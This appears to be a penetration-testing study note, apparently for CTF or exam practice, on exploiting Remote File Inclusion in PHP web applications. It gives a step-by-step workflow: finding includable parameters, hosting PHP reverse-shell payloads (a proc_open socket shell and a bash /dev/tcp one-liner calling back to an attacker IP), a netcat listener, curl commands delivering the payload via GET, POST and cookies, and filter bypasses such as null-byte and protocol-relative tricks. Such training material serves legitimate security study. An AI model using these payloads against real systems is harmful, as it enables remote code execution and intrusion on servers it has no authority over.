
## 🔍 1. Identify Potential RFI Targets

Look for URL parameters that include external files:

- Common parameters: `page=`, `template=`, `file=`, `include=`, `lang=`
    
- URLs ending with `.php` or similar backend scripts.
    
- Error messages mentioning `include()`, `require()`, or `failed to open stream`.
    

**Example:**

`http://webapp.thm/index.php?page=home.php`

---

## 🛠️ 2. Basic Testing

Test if the parameter is vulnerable to external inclusion:

`?page=http://example.com/test.txt`

- If the server tries to fetch your remote file, RFI exists.
    
- Confirm by hosting a simple text file with a unique string on a public server (e.g., your Kali machine with `python3 -m http.server 8000`).
    

---

## 🔄 3. Exploitation Workflow (RFI/LFI → Interactive Shell)

### 1️⃣ Prepare your attacker listener

On Kali (or your attacking machine):

`nc -lvnp 8001`

- Listens for the reverse shell connection.
    

---

### 2️⃣ Host a malicious PHP reverse shell

- Create a PHP file (`revshell.php`) with one of the following payloads:
    

**Option A — proc_open method (preferred if allowed)**

`<?php
	$sock = fsockopen("YOUR_IP", 8001);
	$descriptors = array(
	    0 => $sock, // stdin
	    1 => $sock, // stdout
	    2 => $sock  // stderr
	);
	$proc = proc_open("/bin/sh -i", $descriptors, $pipes);
?>`

**Option B — bash one-liner (CTF-friendly, simpler)**

`<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/8001 0>&1'"); ?>`

- Serve the file via Python HTTP server or Apache:
    

`python3 -m http.server 8000`

---

### 3️⃣ Include the shell via the RFI/LFI parameter

- Standard GET inclusion:
    

`http://TARGET/page.php?page=http://YOUR_IP:8000/revshell.php`

- If the application uses `$_REQUEST` or POST/COOKIE parameters:
    

`# POST example using curl curl -X POST "http://TARGET/page.php" -d "page=http://YOUR_IP:8000/revshell.php"`  

`# Cookie example curl "http://TARGET/page.php" -b "page=http://YOUR_IP:8000/revshell.php"`

> **Tip:** Some boxes filter GET but allow POST/COOKIE — always try all three sources.

---

### 4️⃣ Wait for the shell

- The target should connect back to your listener:
    

`nc -lvnp 8001 listening on [any] 8001 ... connect to [YOUR_IP] from (UNKNOWN) [TARGET_IP] 12345`

- You now have a **fully interactive shell**.
    
- Test basic commands: `id`, `whoami`, `pwd`, `ls -la`.
    

---

### 5️⃣ Fallback if proc_open is disabled

- Use `exec()` or `shell_exec()` variants:
    

`<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/8001 0>&1'"); ?>`

- You can also try [[Web Shells]]

---

### 6️⃣ Notes / Best Practices

- Always confirm which PHP functions are **enabled/disabled** (`phpinfo()` or `ini_get('disable_functions')`).
    
- URL-encode your RFI payload if necessary.
    
- Avoid `system($_GET['cmd'])` in exams — it’s fine for testing, but it’s **single-command only** and non-interactive.
---

## ⚡ 4. Common Protections / Bypasses

- **URL filters**:
    
    - Block `http://` → try `//<IP>/shell.php` (protocol-relative)
        
    - Some apps allow `https://`, `ftp://`, `php://filter`
        
- **Allow-listed extensions**:
    
    - Append allowed extension but still execute PHP:
        
        `shell.php%00` 
        `shell.txt`
        
- **Null byte injection** (older PHP):
    
    `shell.php%00`
    

---

## 🔑 5. Useful Tips

- RFI is only possible if `allow_url_include = On` in PHP.
    
- If you can’t include a remote file directly, try **[[Step 13. File Inclusion - Local File Inclusion (LFI)]] → RCE**.
    
